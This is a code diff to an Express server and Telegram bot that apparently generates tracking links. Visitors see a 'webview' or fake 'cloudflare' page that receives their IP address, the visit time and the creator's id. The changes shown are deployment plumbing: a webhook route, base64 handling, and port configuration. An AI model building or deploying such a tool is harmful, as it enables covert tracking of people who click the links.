@@ -14,6 +14,12 @@ var urlencodedParser=bodyParser.urlencoded({ extended:true,limit:1024*1024*20,ty
 const app = express();
 app.use(jsonParser);
 app.use(urlencodedParser);
+// Telegram webhook route
+app.post(`/bot${process.env.BOT}`, (req, res) => {
+    bot.processUpdate(req.body);
+    res.sendStatus(200);
+});
+
 app.set("view engine", "ejs");
 
 //Modify your URL here
@@ -30,7 +36,7 @@ if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split("
 
 
 if(req.params.path != null){
-res.render("webview",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path});
+res.render("webview",{ip:ip,time:d,url:Buffer.from(req.params.uri, 'base64').toString('utf-8'),uid:req.params.path});
 } 
 else{
 res.redirect("https://t.me/th30neand0nly0ne");
@@ -48,7 +54,7 @@ if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split("
 
 
 if(req.params.path != null){
-res.render("cloudflare",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path});
+res.render("cloudflare",{ip:ip,time:d,url:Buffer.from(req.params.uri, 'base64').toString('utf-8'),uid:req.params.path});
 } 
 else{
 res.redirect("https://t.me/th30neand0nly0ne");
@@ -99,9 +105,7 @@ if(callbackQuery.data=="crenew"){
 createNew(callbackQuery.message.chat.id);
 } 
 });
-bot.on('polling_error', (error) => {
-console.log(error.code); 
-});
+
 
 
 
@@ -113,7 +117,8 @@ var encoded = [...msg].some(char => char.charCodeAt(0) > 127);
 
 if ((msg.toLowerCase().indexOf('http') > -1 || msg.toLowerCase().indexOf('https') > -1 ) && !encoded) {
  
-var url=cid.toString(36)+'/'+btoa(msg);
+var url = cid.toString(36) + '/' + Buffer.from(msg).toString('base64');
+
 var m={
   reply_markup:JSON.stringify({
     "inline_keyboard":[[{text:"Create new Link",callback_data:"crenew"}]]
@@ -216,6 +221,8 @@ res.send("Done");
 
 
 
-app.listen(5000, () => {
-console.log("App Running on Port 5000!");
+const PORT = process.env.PORT || 5000;
+app.listen(PORT, () => {
+    console.log(`App Running on Port ${PORT}!`);
 });
+
